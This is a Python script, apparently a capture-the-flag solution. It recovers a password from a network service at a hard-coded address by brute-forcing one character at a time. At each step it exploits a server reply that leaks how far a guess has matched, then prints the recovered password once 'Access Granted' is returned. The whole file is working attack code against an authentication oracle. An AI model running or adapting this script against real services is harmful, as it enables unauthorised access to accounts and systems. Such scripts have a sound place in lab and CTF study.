import socket
import math

possible_values = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}', '=', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
prime = 19

def netcat(host, port, content, hash_pos):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.sendall(content.encode())
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096)
        if not data:
            break
        data = data.decode('UTF-8')
        if "=" in data and math.floor(float(data.strip().split("=")[1])) > hash_pos + 1:
            s.close()
            return True
    s.close()
    return False

def netcat_last(host, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.sendall(content.encode())
    s.shutdown(socket.SHUT_WR)
    while True:
        data = s.recv(4096)
        if not data:
            break
        data = data.decode('UTF-8')
        if data.startswith("Access Granted"):
            return True
    s.close()
    return False

host = '10.21.235.179'
port = '5555'
pos = [(7*i + 4) % 19 for i in range(prime)]
res = ["=" for i in range(prime)]

for hash_pos in range(0, 18):
    for ele in possible_values:
        #hash_pos is the position in the hash of the password
        #act_pos is the actual position of the element at hash_pos from the hash in the password
        act_pos = pos[hash_pos]
        #try to see if ele is the correct element at act_pos in password
        curr = res.copy()
        curr[act_pos] = ele
        curr = "".join(curr)
        if netcat(host, port, curr, hash_pos):
            res[act_pos] = ele
            print(f"[FOUND] {ele}", end = ' ')
            break
    print(''.join(res))

hash_pos = 18
for ele in possible_values:
    #hash_pos is the position in the hash of the password
    #act_pos is the actual position of the element at hash_pos from the hash in the password
    act_pos = pos[hash_pos]
    #try to see if ele is the correct element at act_pos in password
    curr = res.copy()
    curr[act_pos] = ele
    curr = "".join(curr)
    if netcat_last(host, port, curr):
        res[act_pos] = ele
        print(f"[FOUND] {ele}")
        break
print(f"The password is : {''.join(res)}")